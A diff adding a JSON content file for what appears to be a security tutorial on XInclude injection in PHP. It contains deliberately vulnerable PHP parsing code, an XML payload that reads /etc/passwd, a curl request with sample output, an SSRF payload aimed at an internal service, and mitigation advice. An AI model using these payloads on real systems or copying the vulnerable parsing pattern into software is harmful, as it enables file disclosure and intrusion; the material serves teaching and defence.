@@ -1,0 +1,174 @@
+[
+  {
+    "type": "section_heading",
+    "id": "xinclude-intro",
+    "text": "What is XInclude?"
+  },
+  {
+    "type": "order_block",
+    "id": "xinclude-definition",
+    "text": "<highlight>XInclude</highlight> is an <highlight>XML feature</highlight> that allows one XML document to include content from another file using <highlight><xi:include></highlight> elements. It is processed at the <highlight>XML parsing stage</highlight> and does not require a <highlight>DOCTYPE</highlight> declaration like classic <highlight>XXE</highlight>."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-root-cause",
+    "text": "Root Cause"
+  },
+  {
+    "type": "order_block",
+    "id": "xinclude-root-analysis",
+    "text": "The vulnerability occurs when the <highlight>XML parser</highlight> has <highlight>XInclude processing enabled</highlight> (e.g., <highlight>DOMDocument->xinclude()</highlight>) and <highlight>user-controlled XML input</highlight> is parsed without validation. The parser fetches <highlight>external resources</highlight> referenced in the <highlight>xi:include</highlight> element."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-why-important",
+    "text": "Why XInclude Matters"
+  },
+  {
+    "type": "explanation",
+    "id": "xinclude-difference-from-xxe",
+    "title": "Difference from Classic XXE",
+    "items": [
+      "Does NOT require <highlight><!DOCTYPE></highlight>.",
+      "Works even when <highlight>DTD processing</highlight> is disabled.",
+      "Often bypasses <highlight>naive XXE protections</highlight>.",
+      "Requires explicit <highlight>XInclude processing call</highlight>.",
+      "Looks like normal XML structure (less suspicious)."
+    ]
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-vulnerable-code",
+    "text": "Vulnerable PHP Code"
+  },
+  {
+    "type": "code_block",
+    "id": "xinclude-php-code",
+    "language": "php",
+    "code": "<?php\nlibxml_use_internal_errors(true);\n\n$xml = file_get_contents(\"php://input\");\n\n$dom = new DOMDocument();\n$dom->loadXML($xml);\n$dom->xinclude();\n\necho $dom->saveXML();\n?>"
+  },
+  {
+    "type": "order_block",
+    "id": "xinclude-code-analysis",
+    "text": "The dangerous part is <highlight>$dom->xinclude()</highlight>. This explicitly tells <highlight>libxml</highlight> to process <highlight><xi:include></highlight> elements and fetch <highlight>external resources</highlight>."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-basic-payload",
+    "text": "Basic File Read Payload"
+  },
+  {
+    "type": "code_block",
+    "id": "xinclude-file-read",
+    "language": "xml",
+    "code": "<?xml version=\"1.0\"?>\n<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include href=\"file:///etc/passwd\" parse=\"text\"/>\n</root>"
+  },
+  {
+    "type": "order_block",
+    "id": "xinclude-file-analysis",
+    "text": "The parser fetches <highlight>/etc/passwd</highlight> and inserts its content into the XML output. <highlight>parse=\"text\"</highlight> forces raw text inclusion instead of XML parsing."
+  },
+
+    {
+    "type": "code_block",
+    "id": "xinclude-file-read",
+    "language": "xml",
+    "code": "curl -X POST http://127.0.0.1:8000/vulnerable.php -H \"Content-Type: application/xml\" --data-binary @payload.xml"
+  },
+    {
+    "type": "output_block",
+    "id": "xinclude-file-analysis",
+    "code": "root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-internal-mechanism",
+    "text": "Internal Execution Flow"
+  },
+  {
+    "type": "explanation",
+    "id": "xinclude-flow",
+    "title": "How XInclude Works Internally",
+    "items": [
+      "Parser loads initial XML document.",
+      "Namespace <highlight>http://www.w3.org/2001/XInclude</highlight> is detected.",
+      "When <highlight>xinclude()</highlight> is called, <highlight>libxml</highlight> scans for <highlight><xi:include></highlight> nodes.",
+      "For each include node, libxml fetches the resource from <highlight>href</highlight>.",
+      "Resource is loaded into memory.",
+      "Content replaces the <highlight><xi:include></highlight> element in DOM tree.",
+      "Final DOM is serialized back to output."
+    ]
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-ssrf",
+    "text": "XInclude for SSRF"
+  },
+  {
+    "type": "code_block",
+    "id": "xinclude-ssrf-payload",
+    "language": "xml",
+    "code": "<?xml version=\"1.0\"?>\n<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include href=\"http://127.0.0.1:8080/internal\" parse=\"text\"/>\n</root>"
+  },
+  {
+    "type": "order_block",
+    "id": "xinclude-ssrf-analysis",
+    "text": "If network access is allowed, the server makes a backend <highlight>HTTP request</highlight> to the internal service. This converts XInclude into an <highlight>SSRF primitive</highlight>."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-rce-possibility",
+    "text": "Can XInclude Lead to RCE?"
+  },
+  {
+    "type": "order_block",
+    "id": "xinclude-rce-analysis",
+    "text": "Direct <highlight>RCE</highlight> is rare. XInclude is primarily a <highlight>file read primitive</highlight> or <highlight>SSRF vector</highlight>. However, if included content is later passed to <highlight>eval()</highlight>, <highlight>include()</highlight>, or template rendering engines, it may escalate to code execution."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-detection",
+    "text": "Detecting XInclude Vulnerability"
+  },
+  {
+    "type": "order_block",
+    "id": "xinclude-detection-analysis",
+    "text": "If <highlight>DOCTYPE-based XXE</highlight> is blocked but XInclude works, you will see <highlight>external file content</highlight> reflected after adding <highlight>xmlns:xi</highlight> and <highlight>xi:include</highlight> elements."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-mitigation",
+    "text": "Mitigation"
+  },
+  {
+    "type": "code_block",
+    "id": "xinclude-secure-code",
+    "language": "php",
+    "code": "$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING);\n// DO NOT call $dom->xinclude();"
+  },
+  {
+    "type": "order_block",
+    "id": "xinclude-mitigation-analysis",
+    "text": "Avoid calling <highlight>xinclude()</highlight>. Use <highlight>LIBXML_NONET</highlight> to block network access. Validate or sanitize XML input."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "xinclude-conclusion",
+    "text": "Conclusion"
+  },
+  {
+    "type": "order_block",
+    "id": "xinclude-summary",
+    "text": "<highlight>XInclude</highlight> is an XML inclusion mechanism that can be abused for <highlight>file disclosure</highlight> and <highlight>SSRF</highlight> when <highlight>xinclude()</highlight> processing is enabled. It bypasses traditional <highlight>XXE defenses</highlight> because it does not rely on <highlight>DTD</highlight>."
+  }
+]
